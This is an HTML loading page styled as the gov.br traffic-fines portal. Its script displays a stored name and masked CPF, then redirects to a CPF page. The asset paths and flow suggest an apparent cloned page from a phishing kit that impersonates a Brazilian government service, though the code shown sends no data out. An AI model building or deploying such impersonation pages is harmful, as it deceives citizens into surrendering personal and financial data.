<body class="gov-flow overflow-x-hidden">
    <div id="root" class="min-h-screen bg-gray-50">
        <header class="bg-white shadow-sm border-b fixed top-0 left-0 right-0 z-50">
            <div class="max-w-7xl mx-auto px-3 sm:px-4 h-14 flex items-center justify-between gap-2">
                <div class="flex items-center overflow-hidden min-w-0 flex-1">
                    <a class="flex items-center flex-shrink-0" href="home.html"><img src="../index_files/govbr-logo-large-CK1AxAnO.png" alt="gov.br" class="h-5 sm:h-6"></a>
                    <div class="ml-2 pl-2 sm:ml-4 sm:pl-4 border-l border-gray-300 min-w-0 overflow-hidden">
                        <h1 class="text-[11px] sm:text-sm font-medium text-gray-900 truncate">Multas de trânsito</h1>
                        <p class="hidden sm:block text-xs text-gray-600 truncate">Departamento Estadual de Trânsito</p>
                    </div>
                </div>
                <div class="flex items-center flex-shrink-0">
                    <div class="hidden sm:block text-right mr-3">
                        <p id="top-name" class="text-xs sm:text-sm font-medium text-gray-900 whitespace-nowrap overflow-hidden text-ellipsis max-w-[180px]"></p>
                        <p id="top-cpf" class="text-xs text-gray-600 whitespace-nowrap overflow-hidden text-ellipsis max-w-[180px]"></p>
                    </div>
                    <div id="avatar" class="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-purple-700 flex items-center justify-center text-white font-medium text-xs sm:text-sm">--</div>
                </div>
            </div>

        <main class="max-w-3xl mx-auto px-3 sm:px-4 py-4 mt-20 sm:mt-24">
            <div class="bg-white rounded-lg shadow-sm border p-6 text-center">
                <div class="mx-auto mb-4 h-10 w-10 rounded-full border-4 border-blue-200 border-t-blue-700 animate-spin"></div>
                <p class="text-base font-medium text-gray-900">Carregando informações pessoais...</p>
                <p class="text-sm text-gray-600 mt-1">Aguarde alguns instantes</p>
            </div>
        </main>
    </div>
    <footer class="gov-flow-footer"><div class="gov-flow-footer__inner"><p><strong>gov.br</strong> · Sistema de Infrações e Multas</p><p>Site oficial do Governo Federal</p></div></footer>

    <script>
        function initials(name) {
            const parts = (name || '').trim().split(/\s+/).filter(Boolean);
            if (!parts.length) return '--';
            if (parts.length === 1) return parts[0].slice(0, 2).toUpperCase();
            return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
        }

        const payload = JSON.parse(sessionStorage.getItem('cpf_lookup_payload') || 'null');
        const body = payload && payload.body ? payload.body : {};
        const nome = body.name || '';
        const cpf = body.cpf_masked || '';
        const params = new URLSearchParams(window.location.search);
        const id = params.get('id') || '';

        document.querySelector('#top-name').textContent = nome;
        document.querySelector('#top-cpf').textContent = cpf;
        document.querySelector('#avatar').textContent = initials(nome);

        if (!sessionStorage.getItem('cpf_lookup_cpf')) {
            window.location.replace('home.html');
        } else {
            setTimeout(function () {
                window.location.replace(`cpf.html?id=${encodeURIComponent(id)}`);
            }, 2300);
        }
    </script>
